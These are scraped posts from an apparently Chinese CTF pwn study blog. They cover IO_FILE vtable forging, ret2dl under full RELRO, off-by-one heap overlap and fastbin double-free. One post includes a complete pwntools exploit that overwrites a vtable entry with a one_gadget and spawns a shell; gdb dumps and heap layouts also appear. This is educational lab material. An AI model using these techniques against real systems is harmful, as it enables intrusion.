也就是_IO_XSGETN。 这个函数并不简单，它是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。 vtable也是一个指针，指向结构体_IO_jump_t _IO_jump_t源码如下 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 这里vtable就像一个中转站，通过它调用_IO_jump_t中的各种函数。 比如说这里fread就是调用的_IO_file_xsgetn函数。 值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。 12345678if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123; if (__underflow (fp) == EOF) break; continue; &#125; 函数源码如上，实现的是一个键盘输入。 实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。 伪造vtable在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。 那么应该如何伪造vtable呢？目前有两种思路。 一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。 在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。 但是我们先从第一个方法来试一试。 示例来源于ctf-wiki 1234567891011int main(void)&#123; FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(&quot;call 0x41414141&quot;);&#125; 这边利用的具体步骤比较直观。 遍历 _IO_list_all ，然后调用 _IO_2_1_stdout_ 下的 vtable 中 _setbuf 函数。 承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。 在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。 开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; print _IO_2_1_stdin_$2 = &#123; file = &#123; _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &#x27;\\000&#x27;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125; 我们可以看到vtable的地址是0x7ffff7dca2a0。 然后我们需要在它附近伪造一个vtable。 伪造的vtable需要符合以下条件：1:fake_vtable + 0x58=libc_base+off_3 完整exp 12345678910111213141516171819202122232425from pwn import *context.log_level=&quot;debug&quot;libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)p = process(&#x27;the_end&#x27;)libc_base = long(sleep_ad,16) - libc.symbols[&#x27;sleep&#x27;]one_gadget = libc_base + 0xf02b0vtables = libc_base + 0x3C56F8fake_vtable = libc_base + 0x3c5588target_addr = libc_base + 0x3c55e0for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i])for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i])p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)p.interactive() 总结伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了。 下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。 FSOP上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。 这一个part我们学习FSOP。 ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧/// FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项","categories":[{"name":"OTHER - IO FILE","slug":"OTHER-IO-FILE","permalink":"https://fuurinko.github.io/categories/OTHER-IO-FILE/"}],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]},{"title":"pwn题中的一些奇怪的姿势","slug":"pwn题中的一些奇怪的姿势","date":"2021-08-03T06:56:14.000Z","updated":"2022-03-20T04:32:20.209Z","comments":true,"path":"2021/08/03/pwn题中的一些奇怪的姿势/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"patch alarm比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。 一般来说许多题都喜欢在main函数里加alarm。 alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。 ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。 解决方案也比较弱智。就是直接patch掉就好了。 ida都关了懒得上图了。 单双引号问题​ 萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。 ​ 然后索性调试一下，发现了奇点。 ​ ​ 这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是/bin/sh，但是实际是n/sh，只有后面四个字节了。 ​ 我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样： ​ 但是我的程序是这样： ​ 然后发动传统艺能，控制变量找不同，发现问题出在system(&#39;/bin/sh&#39;)上。 ​ 因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些(&#39;./&#39;) (&quot;./&quot;)，看起来区别不大，实际上也没有什么影响。 ​ 但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 ​ 然后把单引号改成双引号之后，就getshell了。 roputils做ret2dl的时候难免会偷懒使用工具。 但是这个工具并没有看起来那么和善。 就怎么使用utils包我都研究了一会儿，然后发现只需要import roputils然后把相对应的那个py脚本放到同一路径下就好。 但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。 所以解决方式有2 将roputils转换为py3 ubuntu切换py版本 反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接2to3 -w roputils.py 具体参数可以google。 然后又来了第三个问题。 来看我的报错。 1234567891011[+] Starting local process &#x27;./babystack&#x27;: pid 745Traceback (most recent call last): File &quot;babystack.py&quot;, line 23, in &lt;module&gt; rop = roputils.ROP(&#x27;./babystack&#x27;) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 440, in __init__ ELF.__init__(self, *args, **kwargs) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 85, in __init__ m = re.search(r&#x27;^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$&#x27;, line) File &quot;/usr/lib/python3.6/re.py&quot;, line 182, in search return _compile(pattern, flags).search(string)TypeError: cannot use a string pattern on a bytes-like object 这个功能好像并不会在byte前加b。。。 目前来说并没有发现解决方法。 所以只能尝试更换默认的py版本。具体可以google main_arena与多线程在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ret2dl_advanced","slug":"ret2dl_advanced","date":"2021-08-02T03:22:53.000Z","updated":"2022-03-20T04:32:46.603Z","comments":true,"path":"2021/08/02/ret2dl_advanced/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/ret2dl_advanced/","excerpt":"","text":"ret2dl_advanced1)review当FULL RELRO保护开启时，通过 dl_run_time来获取libc基址的方式几乎无解。 但是我们仍然能够找到某种方式来getshell。 相关论文中给出一种解决方案，即通过dt_bug入口找到突破点。 (Ps:为什么找不到相关的中文文章) 2）dt_dbg？dt_dbg这个概念实际上并不新鲜，简单来说它可以被包含在libc.so文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个libc.so文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。 dt_dubug用于指向type_r_debug这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。 此外，这个结构体的r_map域保存了指向link_map的链接表表头的指针。 也就是dt_dbg指向type_r_debug，且type_r_debug维护了指向link_map的指针。 r_debug具体代码如下: 1234567891011121314151617181920/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */struct r_debug &#123; int r_version; /* Version number for this protocol. */ struct link_map *r_map; /* Head of the chain of loaded objects. */ /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */ ElfW(Addr) r_brk; enum &#123; /* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */ RT_CONSISTENT, /* Mapping change is complete. */ RT_ADD, /* Beginning to add a new object. */ RT_DELETE /* Beginning to remove an object mapping. */ &#125; r_state; ElfW(Addr) r_ldbase; /* Base address the linker is loaded at. */ &#125;; 实操一遍 随便写一个无output的栈溢出。 12345678fur1n@ubuntu:~/pwn$ readelf -d ret2dlDynamic section at offset 0xdb8 contains 27 entries: Tag Type Name/Value... 0x0000000000000015 (DEBUG) 0x0 在没有运行的时候dt_dbg为空。 在关闭aslr的情况下找到dt_debug并不困难。 gdb使用elfheader命令查看相关elfheader的地址，可以找到.dynamic 段的地址。 123pwndbg&gt; x/50gx 0x600e20...0x600ee0: 0x0000000000000015 0x00007ffff7ffe140 0x00007ffff7ffe140也就是dt_debug指向的r_debug的地址。 123456789101112pwndbg&gt; x/20gx 0x00007ffff7ffe1400x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe1700x7ffff7ffe150 &lt;_r_debug+16&gt;: 0x00007ffff7de3f40 0x00000000000000000x7ffff7ffe160 &lt;_r_debug+32&gt;: 0x00007ffff7dd3000 0x00000000000000000x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe7100x7ffff7ffe190: 0x0000000000000000 0x00007ffff7ffe1700x7ffff7ffe1a0: 0x0000000000000000 0x00007ffff7ffe6e80x7ffff7ffe1b0: 0x0000000000000000 0x0000000000600e200x7ffff7ffe1c0: 0x0000000000600f00 0x0000000000600ef00x7ffff7ffe1d0: 0x0000000000000000 0x0000000000600ea0 r_debug维护的第一个结构体，也就是link_map地址，即0x00007ffff7ffe170 10x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 这样我们就从dt_debug找到了link_map的地址。 虽然但是。 只是找到link_map没啥用。 我们的最终目的还是寻找到dl_runtime_resolve函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。 能从动态链接库中找到dl_runtime_resolve函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到dl_runtime_resolve函数地址，那么问题就迎刃而解了。 那么如何寻找呢？ 实际比较简单（无aslr的情况），只要根据link_map的结构依次顺下来就好了。 上一个section我们找到了link_map的地址，接下来我们通过link_map逐步找到 dl_runtime_resolve。 首先我们找到libc.so.6文件。 123456789101112131415161718192021pwndbg&gt; x/20gx 0x00007ffff7ffe1700x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710---pwndbg&gt; x/20gx 0x00007ffff7ffe7000x7ffff7ffe700: 0x0000000000000000 0x00000000000000000x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0---pwndbg&gt; x/s 0x00007ffff7ffebb00x7ffff7ffebb0: &quot;linux-vdso.so.1&quot;---pwndbg&gt; x/10gx 0x00007ffff7ffe7100x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb00x7ffff7ffe720: 0x00007ffff7ffb3a0 0x00007ffff7fe2000---pwndbg&gt; x/10gx 0x00007ffff7fe20000x7ffff7fe2000: 0x00007ffff79e2000 0x00007ffff7ffedd0---pwndbg&gt; x/s 0x00007ffff7ffedd00x7ffff7ffedd0: &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; 即0x00007ffff7ffedd0。 0x3即GOT[]入口 1234pwndbg&gt; x/30gx 0x00007ffff7dccb80...0x7ffff7dccc30: 0x0000000000000003 0x00007ffff7dcd000 找到GOT[3] 123pwndbg&gt; x/5gx 0x00007ffff7dcd0000x7ffff7dcd000: 0x00000000003eab80 0x00007ffff7fe20000x7ffff7dcd010: 0x00007ffff7dea8f0 0x00007ffff7b70a10 123456789101112131415pwndbg&gt; xinfo 0x00007ffff7dea8f0Extended information for virtual address 0x7ffff7dea8f0: Containing mapping: 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so Offset information: Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0 Containing ELF sections: .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0 3）exploitation在无aslr并已经获取到dl_runtime_resolve的情况下的利用和patial relro相似。 有aslr的情况。。 我也不会。 4)refrence通过DT_DEBUG来获得各个库的基址 How the ELF Ruined Christmas Finding link_map and _dl_runtime_resolve() under full RELRO ————————————————tbc——————————————————-","categories":[{"name":"STACK - ret2dlsolve","slug":"STACK-ret2dlsolve","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlsolve/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"off by one漏洞学习","slug":"off by one漏洞学习","date":"2021-06-04T16:38:55.000Z","updated":"2022-03-20T04:32:05.940Z","comments":true,"path":"2021/06/05/off by one漏洞学习/","link":"","permalink":"https://fuurinko.github.io/2021/06/05/off%20by%20one%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"学习编写一个堆内存管理程序。 但是这道题其实是ctf-wiki上关于chunk-overlapping的题。。。 先看源码。我以后学堆题必从看源码开始。。 12345678void read_input(char *buf,size_t size)&#123; int ret ; ret = read(0,buf,size); if(ret &lt;=0)&#123; puts(&quot;Error&quot;); _exit(-1); &#125; &#125; 众所周知基础的off by one出题的时候都是在输入或者字符比较的地方搞名堂，这里也不例外。 好好的read不用，搞一个readinput制造刻意的漏洞（bushi） 123456struct heap &#123; size_t size ; char *content ;&#125;;struct heap *heaparray[10]; 没什么好说的，定义一个管理堆块属性的结构体。以及定义堆指针结构。这里是一个11byte的数组。 123456789101112131415161718192021222324252627void create_heap()&#123; int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++)&#123; if(!heaparray[i])&#123; heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i])&#123; puts(&quot;Allocate Error&quot;); exit(1); &#125; printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content)&#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; &#125; &#125;&#125; 创建新堆。 初始化定义一些缓冲区。 关于这个 123456for(i = 0 ; i &lt; 10 ; i++)&#123; if(!heaparray[i])&#123; heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i])&#123; puts(&quot;Allocate Error&quot;); exit(1); 之前一直不是很懂，但是好好看了一下逻辑其实也不难。 heaparray就是一个数组，应该要储存相应数据的地址（指针）， 我们malloc的时候如果malloc成功的话这个数组会被赋值为被分配内存的地址，但是如果分配失败的话数组就还是数组本身，所以会有下一个if判断，如果还是本身便打印malloc失败。 也就是说这应该是一个初始化的过程，我们需要将heap结构赋值。 先留着，下一段需要我们设置heap的size。程序为我们分配了8字节的空间来储存这个size的值，然后就是比较关键的内容了。 12345heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content)&#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; 这里涉及到一个新的操作符-&gt;. “-&gt;”是一个整体，它是用于指向结构体子数据的指针，用来取子数据。 换种说法，如果我们在C语言中定义了一个结构体，然后申明一个指针指向这个结构体，那么我们要用指针取出结构体中的数据，就要用到“-&gt;” 在这个程序里，因为content是结构体heap中的一个被定义的子数据，所以当我们要使用它的时候，我们需要用这个操作符来取出它。具体来说就是取出结构体heap中的子结构content，然后把(char *)malloc(size)赋值给它。 当然，如果下一步操作打发现并不是heaparray[i]-&gt;content的话就打印allocate失败。 12345heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break 我们先给size赋值。这里应该和前面的代码是一个代码段。。 然后是输入content。这里就是我们的漏洞点，我们把结构体中点content取出并用myread给它赋值。 话说这里为什么没有失败的报错提醒呢，可能是为了防止无法利用漏洞？ 之前还有一个疑问就是heap初始化处为什么需要for循环，看完以后发现是我太局限于这一个代码块并且忽视了结尾处的break，这个for循环其实是针对于整个add函数的，我们总共只能分配十个堆结构，这个for正好就是控制我们在需要的时候分配的。。。。 add函数看完以后我们来研究下一个函数 123456789101112131415161718void edit_heap()&#123; int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(heaparray[idx])&#123; printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); &#125;else&#123; puts(&quot;No such heap !&quot;); &#125;&#125; 编辑 分析完add函数以后再看就感觉信手拈来了。 首先创建一个4byte的buf来储存我们的idx，idx = atoi(buf);这个操作之前没有说到，大概是将buf的大小转变为一个int类型的数。 应该不是考点，但是值得关注。 然后接着一个普通的范围限定，接下来就是输入idx然后修改heap的content。没什么好说的。 这个if(heaparray[idx])，它不是逻辑运算语句，所以只要括号里不是什么奇怪的东西一般就能成立。 show和edit基本异曲同工，这里直接省略。 看delete。 堆题最需要关注的感觉还是增和删。 1234567891011121314151617181920void delete_heap()&#123; int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(heaparray[idx])&#123; free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); &#125;else&#123; puts(&quot;No such heap !&quot;); &#125;&#125; 还是先储存idx，以及范围限定。 然后这里是调用free函数，把content以及整个指向heap的指针都free了，并且还将指针置null。 至此比较关键的一些函数都看完了。main函数里值的注意的就是开头的setbuf。 虽然做题的时候知道这个东西不是考点，也没啥存在感，但是如果要写程序的话掌握还是必要的。 1int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 四个参数，流，buf指针，模式，大小 参数stream** – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。 buffer – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。 mode – 这指定了文件缓冲的模式： 模式 描述 _IOFBF 全缓冲：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。 _IOLBF 行缓冲：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。 _IONBF 无缓冲：不使用缓冲。每个 I/O 操作都被即时写入。buffer 和 size 参数被忽略。 size –这是缓冲的大小，以字节为单位 但是还是不清楚调用这个函数的意义在哪里。 查了一下好像是可以加快访问速度。。因为一般做题的时候遇到的setbuf的mode都是0，应该是无缓冲吧，然后对应不使用缓冲。每个 I/O 操作都被即时写入。。。还真的是为了加快速度？ 还有就是switch操作的时候并没有使用for循坏来控制case的值，而是read加atoi的操作，也是为了性能吗？ 贴一下学委的解答，setbuf是为了取消缓冲区，而防止各种奇怪的bug。 然后来看这道题的漏洞利用。 123printf(&quot;Content of heap:&quot;); read_input(*((_QWORD *)*(&amp;heaparray + i) + 1), size); puts(&quot;SuccessFul&quot;); 可以看到输入的时候是多输入了一个字节的，这就造成了（非常刻意）的off by one。 我们创建两个chunk来验证这个漏洞 ![image-20210605154056881](/Users/rin/Library/Application Support/typora-user-images/image-20210605154056881.png) 如图， 1234567891011x603290: 0x0000000000000000 0x00000000000000210x6032a0: 0x0000000000000004 0x00000000006032c0#chunk0 size0x6032b0: 0x0000000000000000 0x00000000000000210x6032c0: 0x0000000061616161 0x0000000000000000#chunk0 content10x6032d0: 0x0000000000000000 0x00000000000000210x6032e0: 0x0000000000000004 0x0000000000603300#chunk2 size0x6032f0: 0x0000000000000000 0x00000000000000210x603300: 0x0000000062626262 0x0000000000000000#chunk2 content0x603310: 0x0000000000000000 0x0000000000020cf10x603320: 0x0000000000000000 0x0000000000000000#top chunk 当我们尝试修改chunk0的话又会出现什么呢。 1234567891011120x145e290: 0x0000000000000000 0x0000000000000021#chunk0 size0x145e2a0: 0x0000000000000018 0x000000000145e2c00x145e2b0: 0x0000000000000000 0x0000000000000021#chunk0 content0x145e2c0: 0x6161616161616161 0x61616161616161610x145e2d0: 0x6161616161616161 0x0000000000000041#repaired chunk1 size0x145e2e0: 0x0000000000000010 0x000000000145e3000x145e2f0: 0x0000000000000000 0x0000000000000021#chunk1 content0x145e300: 0x0000000a62626262 0x00000000000000000x145e310: 0x0000000000000000 0x0000000000000021#chunk2 size0x145e320: 0x0000000000000010 0x000000000145e3400x145e330: 0x0000000000000000 0x0000000000000021#chunk2 content0x145e340: 0x0000000a63636363 0x0000000000000000 可以看到我们申请了三个堆块，原本chunk1的size的size位应该是0x21，而且presize位应该是空，但是由于我们修改chunk0的content的时候输入了0x18个a之后还输入了0x41，而正是由于输入时多比缓冲区多出来了一个字节，导致字节溢出到了下一个chunk，也就是chunk1的presize位。 这里巩固一个人尽皆知的知识点 prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 放在这道题就是我们单字节溢出到了chunk1的prevsize位，但是由于此时chunk0是allocated状态，所以并没有太大的影响，但是当我们释放掉chunk0，也就是当我们溢出了一个字节到presize位，并且将上一个chunk（chunk0）free了以后，我们的chunk1的大小就会变为我们设置的溢出的字节的数。 这里我们选择溢出数是0x41. 所以结果就如刚才gdb里面所显示的，我们的chunk1的size变成了0x41. 但是变成0x41又有什么用呢？我们改怎么利用它呢/ 一个最直观的用处就是我们可以通过修改chunk1的内容来加入一些我们想要的东西。 虽然经过off by one漏洞的利用后我们的chunk1的size是0x41，但是实际上在内存里chunk2的指针并不是向下顺移了0x20，而是还在原地。所以当我们修改chunk1的内容的时候其实就是修改了chunk2的指针。 那么修改chunk2指针有啥用呢。 当我们show一个chunk的时候是不是能够显示出这个chunk的content？ 因为这个程序没有给后门，所以我们需要手动泄露出libc。所以我们需要先泄露某个函数的真实地址。那么我们完全可以通过先把某个函数的got表写进去再show出来。 show出来后我们就能计算函数system的真实地址，并且再次将chunk1的指针修改成system函数。 修改以后当我们free chunk0，相当于chunk0的内容是函数参数，然后因为指针已经指向system，所以直接调用system（‘/bin/sh’） 到这里就能够解释之前的0x41 0x41其实就是为了让编辑chunk0的内容可以直接覆盖掉chunk1的指针，其实把数弄得更大也行，只不过没什么意义了。 exp懒得写了","categories":[{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"Message","slug":"message","date":"2021-05-24T09:18:33.269Z","updated":"2022-03-20T04:31:56.747Z","comments":true,"path":"2021/05/24/message/","link":"","permalink":"https://fuurinko.github.io/2021/05/24/message/","excerpt":"","text":"第二道fastbin double free。 123free(*(void **)&amp;dword_602060[4 * v1 + 2]); dword_602060[4 * v1] = 0; --dword_60204C; 这里没有把指针置为null，所以会产生uaf漏洞。 ida大体分析了一下就会发现，由于没有后门函数，这道题会比上一道难。而且由于RELRO的开启，got所在的数据段是只读的，这里研究一下relro这个保护。 uaf漏洞的利用方式有多种，其中就有修改got表达到任意地址写，从而getshel。但是RELRO这个保护，通过将got表所在的地址变成只读，有效阻止了got表覆盖攻击。 所以说这道题我们不能用覆盖got表的方式来getshell，而是需要用freehook劫持的方式。 大体思路是先通过fastbin double free构造fake chunk指向储存chunk的content的地址并泄露puts函数的真实地址，再获得libc基址，借此修改freehook，使它指向system并调用。 